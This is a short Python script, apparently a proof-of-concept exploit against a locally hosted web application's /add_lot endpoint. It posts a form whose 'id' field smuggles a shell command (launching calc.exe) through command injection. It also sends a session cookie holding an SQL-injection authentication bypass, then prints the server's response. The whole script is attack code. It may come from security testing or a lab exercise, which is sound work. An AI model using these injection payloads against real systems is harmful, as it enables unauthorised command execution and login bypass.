import requests

payload = {'id': '" && calc.exe && echo "', 'amount': '1','price_start':'123','price_end':'455'}
r = requests.post('http://127.0.0.1:8000/add_lot',allow_redirects = False, data=payload,headers={"Cookie": "session_id=\"' OR 1 --\""})
print(r.text,r.headers)